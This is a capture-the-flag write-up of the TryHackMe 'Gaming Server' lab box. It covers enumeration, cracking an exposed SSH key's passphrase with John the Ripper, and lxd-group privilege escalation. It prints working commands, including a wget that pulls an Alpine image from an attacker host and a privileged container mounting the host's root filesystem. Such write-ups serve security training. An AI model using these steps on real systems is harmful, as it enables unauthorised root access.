---
layout: post
title: Gaming Server writeup
subtitle: An Easy Boot2Root box for beginners
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/gs/logo.png
share-img: /assets/img/path.jpg
tags: [ctf,tryhackme, writeup, gamingserver,lxd]
---

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.


## Here is a machine information

| Title | Gamingserver | 
| :------ |:--- | 
| Difficulty | Easy | 
| Point | 120 |
| Maker | Suitguy |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 


## RUST SCAN and Enumeration
Normally, i will use the rustscan as scan the host and gathering machine information


``` rustscan -b 500 machine-ip ```
<em>

-b : the batch size for port scanning, it increases or slows the speed of scanning. Depends on the open file limit of your OS.  If you do 65535 it will do every port at the same time. Although, your OS may not support this [default:4500]
</em>

It will take few time to scan: 

![gs1](/assets/img/gs/gs1.png)

We got 2 open ports. One port 22 is ssh port  and web server port is 80. After try to google some issue relate to shh version. There is no more thing interesting. 

In port 80, i go throung all the tag in the page. In *about.html*, when i click on the button uploads, the server redirect to */uploads*.

![gs1](/assets/img/gs/gs2.png)

There is 3 files. one is dict.list. I guess we can use it to cracking or brute-force somewhere. Just take all the file by download it.

But the interesting thing that i change the extention to .php. The page turn on the upload function.

![gs1](/assets/img/gs/gs3.png)

I looked source page. The Server accepts php file. 

![gs1](/assets/img/gs/gs4.png)

Yeah, i try to upload php reverse shell via upload function. But i have no luck to upload this file. The server may error during upload even upload normal image. I have no clue now. 

I go back to gathering again by running dirsearch. you can get it here: https://github.com/maurosoria/dirsearch

After the dirsearch is done, i got another quite interesting enpoint which is *secret/*. Access to this enpoint, we got the secret key, 

![gs1](/assets/img/gs/gs5.png)

I download the secretKey file and login to machine via ssh. But i don't know what is exact an username in the machine. I get back to main page for trying to find the username. Fortunately, in the source of main page. i got this comment line:

``` <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->```

Then i use john as the username.

``` ssh -i secretKey john@10.10.36.188 ```

But it requires passphrase. 

![gs1](/assets/img/gs/gs6.png)

Now let use the *dict.lst* file to crack passphrase.

I just google how to crack the passphrase of private key. i got this: [cracking private key password](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/)

We will use *john* to crack the password. 

Firstly, we need to convert from ssh private key to john: 

``` /usr/share/john/ssh2john.py secretKey > hash  ```

Final, run john with *dict.lst* to crack the password.

![gs1](/assets/img/gs/gs7.png)

Now access to machine with this password. 

![gs1](/assets/img/gs/gs8.png)


Yeah, we got flag!!!

## Escalation privilege

When check id of user. The user have a lot group.

```uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) ```

lxd group is a bit weird. I try to google what it is. I got this [Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/). In this article, write down very detail. You can check out it. Let's go for the exploit part.

In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

1.  Steps to be performed on the attacker machine:
- Download build-alpine in your local machine through the git repository.
- Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
- Transfer the tar file to the host machine
2. Steps to be performed on the host machine:
- Download the alpine image
- Import image for lxd
- Initialize the image inside a new container.
- Mount the container inside the /root directory

Download and build:

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

On running the above command, alpine-v3.12-x86_64-20200903_0332.tar.gz  file is created in the working directory that we have transferred to the host machine.

```
python3 -m http.server 8080
```

On another hand we will download the alpine-image inside on the host machine.

```
wget http://10.11.*.*:8080/alpine-v3.12-x86_64-20200903_0332.tar.gz .
```

After the image is built it can be added as an image to LXD as follows:

```
lxc image import ./alpine-v3.12-x86_64-20200903_0332.tar.gz  --alias myimage
```

use the list command to check the list of images

```
lxc image list
```

![gs1](/assets/img/gs/gs9.png)

On the host machine: run cmd following:

```

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id

```

![gs1](/assets/img/gs/gs10.png)

Final, in order to find the root flag. 

```
find / -name "root.txt" 2>/dev/null
```

Yeah we got the root flag!!!

![gs1](/assets/img/gs/gs11.png)

SOlVED!!!